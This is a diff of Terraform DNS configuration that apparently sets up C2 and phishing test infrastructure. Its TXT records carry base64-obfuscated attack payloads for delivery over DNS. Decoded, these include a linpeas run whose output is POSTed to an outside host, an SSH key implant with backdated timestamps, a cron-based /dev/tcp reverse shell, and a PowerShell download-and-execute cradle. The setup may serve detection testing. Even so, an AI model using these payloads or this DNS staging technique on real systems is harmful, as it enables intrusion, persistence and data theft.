@@ -1,0 +1,132 @@
+#############################################
+# A Records
+#############################################
+
+resource "hcloud_zone_rrset" "a_c2_malware_edr_tester" {
+  zone = hcloud_zone.m41w423mu572un.name
+  name = "c2-malware-edr-tester"
+  type = "A"
+  ttl  = 60
+
+  records = [
+    { value = "35.228.196.57" },
+  ]
+}
+
+resource "hcloud_zone_rrset" "a_phish_tester" {
+  zone = hcloud_zone.m41w423mu572un.name
+  name = "phish-tester"
+  type = "A"
+  ttl  = 60
+
+  records = [
+    { value = "34.88.103.162" },
+  ]
+}
+
+#############################################
+# TXT Records
+#############################################
+
+resource "hcloud_zone_rrset" "txt_absalomabsalomortherottersclub" {
+  zone = hcloud_zone.m41w423mu572un.name
+  name = "absalomabsalomortherottersclub"
+  type = "TXT"
+  ttl  = 60
+
+  records = [
+    { value = provider::hcloud::txt_record("Y3VybCAtTCBodHRwczovL2dpdGh1Yi5jb20vY2FybG9zcG9sb3AvUEVBU1MtbmcvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2xpbnBlYXMuc2ggfCBzaCA+IC9kZXYvc2htL28udHh0ICYmIGN1cmwgLVggUE9TVCAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiIC1kIEAvZGV2L3NobS9vLnR") },
+    { value = provider::hcloud::txt_record("4dCBodHRwczovL2VvaW8yMGhnam5icHg4eS5tLnBpcGVkcmVhbS5uZXQvICYmIHJtIC9kZXYvc2htL28udHh0ICMgYmFzaCBjcmFkbGUgYnkgZGlsbGlnZW50X2IwMGt3MHJtCg==") },
+  ]
+}
+
+resource "hcloud_zone_rrset" "txt_multipass" {
+  zone = hcloud_zone.m41w423mu572un.name
+  name = "multipass"
+  type = "TXT"
+  ttl  = 60
+
+  records = [
+    { value = provider::hcloud::txt_record("c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUdBbkV3aWczTFBPMkdyUkgvQkZFWHhWK2EvN1pNYUxpdzhDQlphbFBPd3cK") },
+  ]
+}
+
+resource "hcloud_zone_rrset" "txt_opentofu" {
+  zone = hcloud_zone.m41w423mu572un.name
+  name = "opentofu"
+  type = "TXT"
+  ttl  = 3600
+
+  records = [
+    { value = provider::hcloud::txt_record("sometext") },
+  ]
+}
+
+resource "hcloud_zone_rrset" "txt_pneumono" {
+  zone = hcloud_zone.m41w423mu572un.name
+  name = "pneumonoultramicroscopicsilicovolcanoconiosis"
+  type = "TXT"
+  ttl  = 60
+
+  records = [
+    { value = provider::hcloud::txt_record("b2xkZXN0X3VzZXI9JChscyAtbHQgL2hvbWUgfCB0YWlsIC1uIDEgfCBhd2sgJ3twcmludCAkOX0nKSAmJiBrZXk9JChkaWcgK3Nob3J0IFRYVCBtdWx0aXBhc3MubTQxdzQyM211NTcydW4ueHl6IHwgdHIgLWQgJyInIHwgYmFzZTY0IC1kKSAmJiBlY2hvICIka2V5IiA+PiAvaG9tZS8kb2xkZXN0X3VzZXIvLnNzaC9hdXRob3JpemVkX2t") },
+    { value = provider::hcloud::txt_record("leXMgJiYgdG91Y2ggLWQgIjIgbW9udGhzIGFnbyIgL2hvbWUvJG9sZGVzdF91c2VyLy5zc2gvYXV0aG9yaXplZF9rZXlzICYmIGVjaG8gInBlcnNpc3RlbmNlIGFkZGVkIGFuZCBhdXRob3JpemVkX2tleXMgYmFja2RhdGVkIGZvciB1c2VyOiAkb2xkZXN0X3VzZXIiICMgc3NoIHNoZW5hbmlnYW5zIGJ5IDBibm94aW91c18wd2wK") },
+  ]
+}
+
+resource "hcloud_zone_rrset" "txt_ps" {
+  zone = hcloud_zone.m41w423mu572un.name
+  name = "ps"
+  type = "TXT"
+  ttl  = 60
+
+  records = [
+    { value = provider::hcloud::txt_record("powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kaywoz/bluestuff/main/powershell/Payload-nonsense.ps1')\"") },
+  ]
+}
+
+resource "hcloud_zone_rrset" "txt_second" {
+  zone = hcloud_zone.m41w423mu572un.name
+  name = "second"
+  type = "TXT"
+  ttl  = 60
+
+  records = [
+    { value = provider::hcloud::txt_record("placeholder bash") },
+  ]
+}
+
+resource "hcloud_zone_rrset" "txt_test" {
+  zone = hcloud_zone.m41w423mu572un.name
+  name = "test"
+  type = "TXT"
+  ttl  = 60
+
+  records = [
+    { value = provider::hcloud::txt_record("aG9zdG5hbWU=") },
+  ]
+}
+
+resource "hcloud_zone_rrset" "txt_trainstation" {
+  zone = hcloud_zone.m41w423mu572un.name
+  name = "trainstation"
+  type = "TXT"
+  ttl  = 60
+
+  records = [
+    { value = provider::hcloud::txt_record("https://key.m41w423mu572un.xyz/trainticket.ps1") },
+  ]
+}
+
+resource "hcloud_zone_rrset" "txt_wolfeschlegel" {
+  zone = hcloud_zone.m41w423mu572un.name
+  name = "wolfeschlegelsteinhausenbergerdorff"
+  type = "TXT"
+  ttl  = 60
+
+  records = [
+    { value = provider::hcloud::txt_record("KHN1YmRvbWFpbj0kKGRpZyArc2hvcnQgVFhUIGxsYW5mYWlycHdsbGd3eW5neWxsZ29nZXJ5Y2h3eXJuZHJvYnd5bGxsbGFudHlzaWxpb2dvZ29nb2NoLm9idmlvdXNwaGlzaC5jb20gfCB0ciAtZCAnIicgfCBiYXNlNjQgLWRpKTsgY3JvbnRhYiAtbCA+IC50YWI7IGVjaG8gIjIgKiAqICogKiAvYmluL2Jhc2ggLWwgPiAvZGV2L3RjcC8") },
+    { value = provider::hcloud::txt_record("kc3ViZG9tYWluLm9idmlvdXNwaGlzaC5jb20vNDI0MiAwPCYxIDI+JjEiID4+IC50YWI7IGNyb250YWIgLnRhYjsgcm0gLnRhYikgPiAvZGV2L251bGwgMj4mMSAjIG1pc2NoaWVmIGFuZCBtaXNkaXJlY3Rpb24gYnkgbGlsTTBua3kK") },
+  ]
+}
+
